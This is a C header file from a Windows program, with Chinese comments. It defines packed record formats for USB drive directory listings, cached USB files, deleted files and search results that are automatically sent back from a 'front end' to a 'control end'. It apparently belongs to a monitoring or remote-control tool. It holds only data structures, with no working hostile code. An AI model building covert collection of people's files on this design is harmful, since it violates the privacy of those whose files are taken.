/**************************************************************
 * Module:
 *        FileTask.h
 *
 * Author:
 *        DING ZHAOKUN(dzkad@hotmail.com)
 *
 * Time:
 *        20100307
 *
 * Notes
 *		自动回传的文件
 *			USB盘目录列表缓存
 *			USB盘文件缓存
 *			删除文件缓存
 *			搜索文件结果
 *			
 *
 */

#ifndef _DZK_19780810_FILETASK_H_
#define _DZK_19780810_FILETASK_H_

#ifdef __cplusplus
extern "C" {
#endif //__cplusplus

#define TFILE_SINGNATURE		0x197877

//
// 自动回传的文件类型
//
#define	CACHED_USBFILE		0x0001
#define CACHED_USBDIR		0x0002
#define	CACHED_DELFILE		0x0003
#define SEARCHED_FILE		0x0004

// 
// 由于下面的结构会在前端和控制端使用，故统一其字节对齐为1字节
//
#pragma pack(1)

//
// 文件缓存 头部
//
typedef struct tag_TCACHED_FILE_HEADER
{
	DWORD		dwSingnature;				// 标识
	DWORD		dwHeaderType;				// 头类型
	DWORD		dwHeaderSize;				// 头大小

	WCHAR		wzRealPath[MAX_PATH];		// 文件原路径
	DWORD		dwFileSize;					// 文件大小

	FILETIME	ftCreationTime;				// 文件创建时间
	FILETIME	ftLastAccessTime;			// 文件最后访问时间
	FILETIME	ftLastWriteTime;			// 文件最后修改时间

	FILETIME	ftActionTime;				// 文件缓存时间

} TCACHED_FILE_HEADER,
*PTCACHED_FILE_HEADER;

//
// 目录缓存 头部
//

typedef struct tag_TCACHED_USBDIR_HEADER
{
	DWORD		dwSingnature;				// 标识
	DWORD		dwHeaderType;				// 头类型
	DWORD		dwHeaderSize;				// 头大小
	
	WCHAR		wcDriverLetter;				// 磁盘盘符
	FILETIME	ftInTime;					// USB插入时间
	FILETIME	ftOutTime;					// USB拔出时间

} TCACHED_USBDIR_HEADER,
*PTCACHED_USBDIR_HEADER;

#pragma pack()		// 取消1字节对齐方式

#ifdef __cplusplus
}
#endif // __cplusplus

#endif // ! _DZK_19780810_FILETASK_H_
